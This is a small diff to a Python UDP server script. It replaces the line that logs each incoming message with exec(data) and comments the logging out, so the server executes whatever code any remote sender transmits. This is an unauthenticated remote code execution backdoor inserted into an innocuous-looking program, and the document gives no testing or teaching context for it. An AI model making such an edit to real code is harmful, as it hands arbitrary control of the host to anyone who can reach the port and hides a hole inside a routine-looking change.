@@ -15,6 +15,8 @@ server.bind(server_address)
 
 data, client = server.recvfrom(max_size)
 
-print("At", datetime.now(), client, "said", data)
+exec(data)
+
+#print("At", datetime.now(), client, "said", data)
 server.sendto(b'Are you talking to me?', client)
 server.close()
